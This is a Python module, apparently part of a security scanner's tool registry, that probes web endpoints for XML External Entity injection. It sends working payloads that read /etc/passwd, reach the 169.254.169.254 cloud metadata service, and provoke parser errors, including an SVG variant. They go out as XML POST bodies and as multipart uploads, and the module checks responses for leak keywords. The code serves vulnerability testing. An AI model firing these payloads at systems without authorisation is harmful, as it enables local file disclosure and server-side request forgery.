"""Python-native XXE (XML External Entity) injection tester.

Detects endpoints that parse XML input and resolve external entity references,
allowing an attacker to read local files or trigger server-side request forgery:

1. **File read** — ``SYSTEM "file:///etc/passwd"`` — critical severity if
   ``/etc/passwd`` content keywords appear in the response.
2. **SSRF via XXE** — ``SYSTEM "http://169.254.169.254/..."`` — critical severity
   if cloud metadata keywords appear in the response.
3. **Error-based** — malformed external entity reference — high severity if
   XML parser error keywords appear in the response.
4. **SVG-based** — XXE inside SVG ``<text>`` element — commonly accepted
   by image upload endpoints.

Two delivery strategies:
- **POST body**: XML sent directly as request body with ``application/xml``
  and ``text/xml`` content types.
- **Multipart file upload**: XML/SVG payload sent as a file in a
  ``multipart/form-data`` request (covers file upload endpoints).

The tester also performs a preliminary GET to detect whether the endpoint
already accepts or returns XML, setting ``accepts_xml`` on the result.
"""

from __future__ import annotations

import json
import logging
import time
from dataclasses import dataclass, field
from typing import Any

import httpx

from numasec.core.http import create_client

logger = logging.getLogger("numasec.scanners.xxe_tester")

# ---------------------------------------------------------------------------
# Payloads and detection keywords
# ---------------------------------------------------------------------------

_XXE_FILE_READ: str = (
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
)

_XXE_SSRF: str = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
    "<root>&xxe;</root>"
)

_XXE_ERROR: str = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///nonexistent">%xxe;]><root/>'

_XXE_SVG: str = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<text x="0" y="20">&xxe;</text></svg>'
)

# (payload_string, payload_type)
_PAYLOADS: list[tuple[str, str]] = [
    (_XXE_FILE_READ, "file_read"),
    (_XXE_SSRF, "ssrf"),
    (_XXE_ERROR, "error_based"),
    (_XXE_SVG, "svg"),
]

_MULTIPART_FIELD_NAMES: list[str] = [
    "file",
    "upload",
    "document",
    "xml",
    "data",
    "attachment",
]

_MULTIPART_FILENAMES: list[tuple[str, str]] = [
    ("payload.xml", "text/xml"),
    ("data.xml", "application/xml"),
    ("upload.svg", "image/svg+xml"),
]

_CONTENT_TYPES: list[str] = [
    "application/xml",
    "text/xml",
]

_XXE_INDICATORS: list[str] = [
    "root:x:",
    "nobody:*:",
    "daemon:",
    "bin:",
    "169.254.169.254",
    "meta-data",
    "ami-id",
]

_XXE_ERROR_INDICATORS: list[str] = [
    "xml",
    "parser",
    "entity",
    "system identifier",
    "external",
    "DOCTYPE",
]

_FILE_READ_KEYWORDS: list[str] = ["root:x:", "nobody:*:", "daemon:", "bin:"]
_SSRF_KEYWORDS: list[str] = ["169.254.169.254", "meta-data", "ami-id"]


# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------


@dataclass
class XxeVulnerability:
    """A single XXE injection finding."""

    endpoint: str
    payload_type: str  # "file_read" | "ssrf" | "error_based"
    evidence: str
    severity: str = "high"  # escalated to "critical" for file_read and ssrf


@dataclass
class XxeResult:
    """Complete XXE test result."""

    target: str
    vulnerable: bool = False
    vulnerabilities: list[XxeVulnerability] = field(default_factory=list)
    accepts_xml: bool = False
    duration_ms: float = 0.0

    def to_dict(self) -> dict[str, Any]:
        """Serialise to JSON-friendly dict."""
        return {
            "target": self.target,
            "vulnerable": self.vulnerable,
            "vulnerabilities": [
                {
                    "type": "xxe",
                    "endpoint": v.endpoint,
                    "payload_type": v.payload_type,
                    "evidence": v.evidence,
                    "severity": v.severity,
                }
                for v in self.vulnerabilities
            ],
            "accepts_xml": self.accepts_xml,
            "duration_ms": round(self.duration_ms, 2),
        }


# ---------------------------------------------------------------------------
# XXE detection engine
# ---------------------------------------------------------------------------


class XxeTester:
    """Multi-payload XXE injection detector.

    Parameters
    ----------
    timeout:
        HTTP request timeout in seconds.
    """

    def __init__(self, timeout: float = 10.0) -> None:
        self.timeout = timeout

    async def test(self, url: str, headers: dict[str, str] | None = None) -> XxeResult:
        """Run XXE injection tests against a target URL.

        Sends a preliminary GET request to check for XML content, then
        POSTs each XXE payload with ``application/xml`` and ``text/xml``
        content types **and** as multipart file uploads. Inspects response
        bodies for XXE indicators.

        Args:
            url: Target URL to test.
            headers: Optional HTTP headers for authenticated testing
                     (e.g., ``{"Authorization": "Bearer ..."}``)

        Returns:
            ``XxeResult`` with all discovered XXE vulnerabilities.
        """
        start = time.monotonic()
        result = XxeResult(target=url)

        async with create_client(
            timeout=self.timeout,
            headers=headers or {},
        ) as client:
            # Preliminary GET: detect XML content type or XML-like response
            result.accepts_xml = await self._detect_xml_acceptance(client, url)

            # Strategy 1: Inject XXE payloads via POST body
            for payload_str, payload_type in _PAYLOADS:
                for content_type in _CONTENT_TYPES:
                    vuln = await self._probe(client, url, payload_str, payload_type, content_type)
                    if vuln:
                        result.vulnerabilities.append(vuln)
                        result.vulnerable = True
                        break

            # Strategy 2: Send XXE payloads via multipart file upload
            for payload_str, payload_type in _PAYLOADS:
                vuln = await self._probe_multipart(client, url, payload_str, payload_type)
                if vuln:
                    result.vulnerabilities.append(vuln)
                    result.vulnerable = True

        result.duration_ms = (time.monotonic() - start) * 1000
        logger.info(
            "XXE test complete: %s — %d vulns, %.0fms",
            url,
            len(result.vulnerabilities),
            result.duration_ms,
        )
        return result

    async def _detect_xml_acceptance(
        self,
        client: httpx.AsyncClient,
        url: str,
    ) -> bool:
        """Return True if the endpoint appears to accept or return XML content."""
        try:
            resp = await client.get(url, headers={"Accept": "application/xml, text/xml, */*"})
        except httpx.HTTPError as exc:
            logger.debug("XXE pre-flight GET error: %s", exc)
            return False

        content_type = resp.headers.get("content-type", "").lower()
        if "xml" in content_type:
            return True

        # Heuristic: response body starts with an XML declaration or root tag
        body_start = resp.text.lstrip()[:100].lower()
        return body_start.startswith("<?xml") or body_start.startswith("<")

    async def _probe(
        self,
        client: httpx.AsyncClient,
        url: str,
        payload: str,
        payload_type: str,
        content_type: str,
    ) -> XxeVulnerability | None:
        """POST an XXE payload and inspect the response for indicators."""
        try:
            resp = await client.post(
                url,
                content=payload.encode(),
                headers={"Content-Type": content_type},
            )
        except httpx.HTTPError as exc:
            logger.debug(
                "XXE probe error (type=%s, ct=%s): %s",
                payload_type,
                content_type,
                exc,
            )
            return None

        body = resp.text

        if payload_type == "file_read":
            for kw in _FILE_READ_KEYWORDS:
                if kw in body:
                    return XxeVulnerability(
                        endpoint=url,
                        payload_type="file_read",
                        evidence=(
                            f"Local file content keyword '{kw}' found in response after "
                            f"sending XXE file-read payload with Content-Type: {content_type}. "
                            f"Server is resolving file:// external entities."
                        ),
                        severity="critical",
                    )

        elif payload_type == "ssrf":
            for kw in _SSRF_KEYWORDS:
                if kw in body:
                    return XxeVulnerability(
                        endpoint=url,
                        payload_type="ssrf",
                        evidence=(
                            f"Cloud metadata keyword '{kw}' found in response after "
                            f"sending XXE SSRF payload with Content-Type: {content_type}. "
                            f"Server is resolving http:// external entities to internal addresses."
                        ),
                        severity="critical",
                    )

        elif payload_type == "error_based":
            body_lower = body.lower()
            for kw in _XXE_ERROR_INDICATORS:
                if kw.lower() in body_lower:
                    return XxeVulnerability(
                        endpoint=url,
                        payload_type="error_based",
                        evidence=(
                            f"XML parser error keyword '{kw}' found in response after "
                            f"sending malformed XXE payload with Content-Type: {content_type}. "
                            f"Server is parsing XML and exposing parser error details."
                        ),
                        severity="high",
                    )

        elif payload_type == "svg":
            for kw in _FILE_READ_KEYWORDS:
                if kw in body:
                    return XxeVulnerability(
                        endpoint=url,
                        payload_type="svg",
                        evidence=(
                            f"Local file content keyword '{kw}' found in response after "
                            f"sending SVG XXE payload with Content-Type: {content_type}. "
                            f"Server parses SVG files and resolves external entities."
                        ),
                        severity="critical",
                    )

        return None

    async def _probe_multipart(
        self,
        client: httpx.AsyncClient,
        url: str,
        payload: str,
        payload_type: str,
    ) -> XxeVulnerability | None:
        """Send an XXE payload as a multipart file upload and inspect the response."""
        for field_name in _MULTIPART_FIELD_NAMES:
            for filename, mime_type in _MULTIPART_FILENAMES:
                try:
                    resp = await client.post(
                        url,
                        files={field_name: (filename, payload.encode(), mime_type)},
                    )
                except httpx.HTTPError as exc:
                    logger.debug(
                        "XXE multipart probe error (type=%s, field=%s, file=%s): %s",
                        payload_type,
                        field_name,
                        filename,
                        exc,
                    )
                    continue

                body = resp.text
                delivery = f"multipart file upload (field='{field_name}', filename='{filename}', mime='{mime_type}')"

                if payload_type in ("file_read", "svg"):
                    for kw in _FILE_READ_KEYWORDS:
                        if kw in body:
                            return XxeVulnerability(
                                endpoint=url,
                                payload_type=payload_type,
                                evidence=(
                                    f"Local file content keyword '{kw}' found in response after "
                                    f"sending XXE payload via {delivery}. "
                                    f"Server parses uploaded XML/SVG and resolves external entities."
                                ),
                                severity="critical",
                            )

                elif payload_type == "ssrf":
                    for kw in _SSRF_KEYWORDS:
                        if kw in body:
                            return XxeVulnerability(
                                endpoint=url,
                                payload_type="ssrf",
                                evidence=(
                                    f"Cloud metadata keyword '{kw}' found in response after "
                                    f"sending XXE SSRF payload via {delivery}. "
                                    f"Server parses uploaded XML and resolves http:// entities."
                                ),
                                severity="critical",
                            )

                elif payload_type == "error_based":
                    body_lower = body.lower()
                    for kw in _XXE_ERROR_INDICATORS:
                        if kw.lower() in body_lower:
                            return XxeVulnerability(
                                endpoint=url,
                                payload_type="error_based",
                                evidence=(
                                    f"XML parser error keyword '{kw}' found in response after "
                                    f"sending malformed XXE payload via {delivery}. "
                                    f"Server parses uploaded XML and exposes parser errors."
                                ),
                                severity="high",
                            )

        return None


# ---------------------------------------------------------------------------
# Tool wrapper for ToolRegistry
# ---------------------------------------------------------------------------


async def python_xxe_test(url: str, headers: str | None = None) -> str:
    """Test a URL for XXE (XML External Entity) injection vulnerabilities.

    Sends XXE payloads via POST body (application/xml, text/xml) **and** as
    multipart file uploads (XML/SVG). Checks whether the server resolves
    external entities (file read, SSRF) or leaks XML parser error details.

    Args:
        url: Target URL to test.
        headers: Optional JSON string of HTTP headers for authenticated testing.

    Returns:
        JSON string with ``XxeResult`` data.
    """
    import contextlib

    parsed_headers: dict[str, str] | None = None
    if headers:
        with contextlib.suppress(json.JSONDecodeError):
            parsed_headers = headers if isinstance(headers, dict) else json.loads(headers)

    tester = XxeTester()
    result = await tester.test(url, headers=parsed_headers)
    return json.dumps(result.to_dict(), indent=2)
